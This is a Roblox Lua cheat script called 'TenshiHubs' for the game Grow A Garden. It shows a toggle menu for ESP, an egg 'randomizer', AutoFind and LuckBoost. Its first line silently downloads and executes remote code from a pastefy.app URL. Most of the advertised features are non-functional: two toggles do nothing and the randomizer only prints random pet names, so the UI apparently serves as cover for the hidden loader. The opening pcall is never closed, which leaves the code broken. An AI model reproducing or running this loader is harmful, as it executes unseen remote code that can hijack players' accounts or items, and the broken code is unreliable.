-- === EXECUTE YOUR MAIN SCRIPT IMMEDIATELY ===
pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/inoixEbY/raw"))()

-- === REMOVE ANY EXISTING UI DUPLICATES ===
local player = game.Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")
if pgui:FindFirstChild("TenshiHubs_UI") then
    pgui.TenshiHubs_UI:Destroy()
end

-- === CREATE NEW UI ===
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TenshiHubs_UI"
ScreenGui.Parent = pgui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Toggle button (fixed position)
local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Name = "ToggleBtn"
ToggleBtn.Parent = ScreenGui
ToggleBtn.Size = UDim2.new(0, 120, 0, 30)
ToggleBtn.Position = UDim2.new(0, 10, 1, -50)
ToggleBtn.AnchorPoint = Vector2.new(0, 1)
ToggleBtn.Text = "TenshiHubs"
ToggleBtn.Font = Enum.Font.GothamBold
ToggleBtn.TextSize = 18
ToggleBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ToggleBtn.BorderSizePixel = 0

-- Main draggable UI frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.Size = UDim2.new(0, 260, 0, 220)
MainFrame.Position = UDim2.new(0.5, -130, 0.5, -110)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Visible = true
MainFrame.BorderSizePixel = 0

-- Title label
local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.Text = "TenshiHubs UI"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Title.BorderSizePixel = 0

-- Toggle state holders
local states = {
    Randomizer = false,
    ESP = false,
    AutoFind = false,
    LuckBoost = false
}

-- Toggle creation helper
local function makeToggle(labelText, idxY)
    local btn = Instance.new("TextButton")
    btn.Parent = MainFrame
    btn.Size = UDim2.new(0.9, 0, 0, 30)
    btn.Position = UDim2.new(0.05, 0, 0, 30 + (idxY - 1) * 40)
    btn.Text = labelText .. ": OFF"
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
    btn.BorderSizePixel = 0

    btn.MouseButton1Click:Connect(function()
        states[labelText] = not states[labelText]
        btn.Text = labelText .. ": " .. (states[labelText] and "ON" or "OFF")
    end)

    return btn
end

-- Create toggles
makeToggle("Randomizer", 1)
makeToggle("ESP", 2)
makeToggle("AutoFind", 3)
makeToggle("LuckBoost", 4)

-- Toggle main UI visibility from the bottom button
ToggleBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

-- === EGG ESP & RANDOMIZER LOGIC ===

-- Full EggData based on Grow A Garden wiki
local EggData = {
    ["Common Egg"] = {"Bunny","Dog","Golden Lab"},
    ["Uncommon Egg"] = {"Black Bunny","Chicken","Cat","Deer"},
    ["Rare Egg"] = {"Orange Tabby","Spotted Deer","Pig","Rooster","Monkey"},
    ["Legendary Egg"] = {"Cow","Silver Monkey","Sea Otter","Turtle","Polar Bear"},
    ["Mythical Egg"] = {"Grey Mouse","Brown Mouse","Squirrel","Red Giant Ant","Red Fox"},
    ["Bug Egg"] = {"Snail","Giant Ant","Caterpillar","Praying Mantis","Dragonfly"},
    ["Bee Egg"] = {"Bee","Honey Bee","Bear Bee","Petal Bee","Queen Bee"},
    ["Anti Bee Egg"] = {"Wasp","Tarantula Hawk","Moth","Butterfly","Disco Bee"},
    ["Summer Egg"] = {"Flamingo","Toucan","Orangutan","Seal","Sea Turtle"}
}

-- Highlight eggs
local function highlightEggs()
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("Model") and EggData[v.Name] then
            if not v:FindFirstChild("TenshiESP") then
                local sel = Instance.new("SelectionBox")
                sel.Adornee = v
                sel.Color3 = Color3.new(1, 1, 0)
                sel.LineThickness = 0.05
                sel.Name = "TenshiESP"
                sel.Parent = v
            end
        elseif v:FindFirstChild("TenshiESP") then
            v.TenshiESP:Destroy()
        end
    end
end

-- Randomize eggs
local function randomizeEggs()
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("Model") and EggData[v.Name] then
            local pets = EggData[v.Name]
            local chosen = pets[math.random(1, #pets)]
            print("Rolled " .. v.Name .. " â†’ " .. chosen)
        end
    end
end

-- Main loop
game:GetService("RunService").RenderStepped:Connect(function()
    if states.ESP then
        highlightEggs()
    end

    if states.Randomizer then
        randomizeEggs()
        task.wait(2)
    end
end)
